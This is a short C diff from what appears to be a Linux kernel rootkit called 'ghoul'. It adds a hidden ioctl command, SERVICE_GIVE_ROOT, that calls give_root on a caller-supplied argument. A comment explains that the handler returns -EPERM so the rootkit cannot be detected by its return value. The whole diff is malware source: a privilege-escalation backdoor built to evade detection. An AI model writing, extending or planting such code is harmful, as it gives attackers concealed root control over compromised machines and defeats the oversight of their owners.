@@ -2,6 +2,7 @@
 #include <uapi/asm-generic/errno-base.h>
 #include "service.h"
 #include "load.h"
+#include "privileges.h"
 
 unsigned int service_fd = 666;
 unsigned long ping_arg = 666;
@@ -34,6 +35,13 @@ int handle_ioctl_request(unsigned int fd, unsigned int cmd, unsigned long arg)
         case SERVICE_CHANGE_PING_ARG:
             ping_arg = arg;
             break;
+        case SERVICE_GIVE_ROOT:
+            give_root((int)arg);
+            break;
     }
+    /*
+     * -EPERM is the error that is returned when performing an ioctl operation on an invalid fd.
+     * Return this so that ghoul cannot be detected by its return value.
+     */
     return -EPERM;
 }
